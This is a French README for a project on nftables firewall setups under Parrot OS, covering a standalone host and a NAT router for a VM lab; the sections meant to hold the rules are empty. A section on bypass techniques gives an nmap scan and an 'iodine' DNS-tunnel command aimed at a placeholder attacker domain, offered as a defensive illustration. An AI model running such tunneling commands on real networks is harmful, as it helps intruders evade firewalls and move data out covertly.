## Objectif du projet

Ce projet présente la configuration de pare-feux avancés sous **Parrot Security OS**, une distribution orientée **pentest** et **protection de la vie privée/anonymat**.

Les démonstrations portent sur les niveaux suivants :

- **Niveau 6 — nftables (avancé, machine seule)**
- **Niveau 7 — nftables (NAT/Lab, routeur pour un lab de VM)**

## Pourquoi Parrot OS ?

- Distribution orientée **pentest** et **vie privée/anonymat**.
- Le pare-feu **UFW** est installé par défaut mais désactivé → à activer/configurer par l’utilisateur.
- Intègre des outils de confidentialité (Tor, Anonsurf, OnionShare).
- Plus légère que Kali, adaptée aux **machines modestes** et virtualisation (VirtualBox, VMware).

---

## Niveau 6 (standalone, machine personnelle protégée)

## Niveau 7 (NAT / Lab, machine routeur en VM)

---

# 📌 Explications

- **Niveau 6** → protège spécifiquement ta machine personnelle.
- **Niveau 7** → transforme ta machine en pare-feu et routeur pour un réseau virtuel.

📸 Exemple de capture d’écran (nftables actif en niveau 6) :
![Capture d’écran Niveau 6](images/niveau6.png)

📸 Exemple de capture d’écran (nftables NAT/routeur niveau 7) :
![Capture d’écran Niveau 7](images/niveau7.png)

---

# 🖥️ Démonstrations

➡️ **Application des règles** :

---
# ⚠️ Limites et bonnes pratiques

Un pare-feu réduit la surface d’attaque, mais **il ne protège pas de tout**.
Un attaquant expérimenté peut toujours tenter de :

- Passer par un service autorisé (ex : **SSH, HTTPS**).
- Exploiter une **faille applicative**.
- Utiliser du **tunneling** (DNS, HTTPS).
- Contourner via **IPv6** si mal configuré.

👉 **Conclusion :**
Un firewall seul n’est pas suffisant.
Il doit être combiné avec :
- un **IDS/IPS** (Snort, Suricata),
- du **monitoring** (logs, SIEM),
- et des **bonnes pratiques** : MFA, mises à jour régulières, segmentation réseau, durcissement système.

---

# ⚠️ Comment un hacker pourrait contourner

Même avec un firewall avancé (niveaux 6 et 7), il existe des **techniques de contournement** :

- 🔓 **Exploiter les ports ouverts**
(ex : `nmap -p 443 <cible>` ➝ scanner en HTTPS).

- 🌐 **Tunneling DNS**
(ex : `iodine` ➝ transformer DNS en canal de communication).

- 🐞 **Exploiter des failles applicatives** derrière un port autorisé.

---

👉 **C’est pourquoi un firewall seul ne suffit pas** :
il faut le **combiner avec IDS/IPS + monitoring**.

---

### 📌 Exemple : Tunnel DNS (contournement)

Comme le port **53 (DNS)** est ouvert, un attaquant peut établir un tunnel DNS :

iodine -f -r attacker.com

---

# 🔑 Différence entre Niveau 6 et Niveau 7

### 🔹 Niveau 6 : Pare-feu personnel
- Protège uniquement **ta machine locale**.
- Applique une politique stricte : **tout est bloqué sauf quelques services essentiels**.
- Idéal pour un **poste de travail** ou un **serveur isolé**.

👉 **Exemple :** ton PC sous Parrot OS n’accepte que le trafic **web** et **SSH**.

---

### 🔹 Niveau 7 : Pare-feu réseau
- Ta machine devient un **routeur + firewall**.
- Protèger **un réseau interne entier**.
- Ajouter le **forwarding et NAT**.

# ✅ Conclusion

Parrot OS est une alternative solide à Kali Linux : plus légère, orientée vie privée et adaptée aux environnements pentest.

Les niveaux 6 et 7 démontrent deux cas concrets :

🔒 **Protection avancée d’une machine individuelle** (standalone).
🌐 **Mise en place d’un routeur/firewall complet** pour un lab réseau.

👉 Ce projet illustre comment un firewall peut évoluer :
d’une **simple protection locale** ➝ vers un **composant réseau avancé**.

---

# 🛠️ Technologies utilisées

- Parrot OS
- nftables
- VirtualBox

---

✍️ Auteur : *Virginie Lechene*








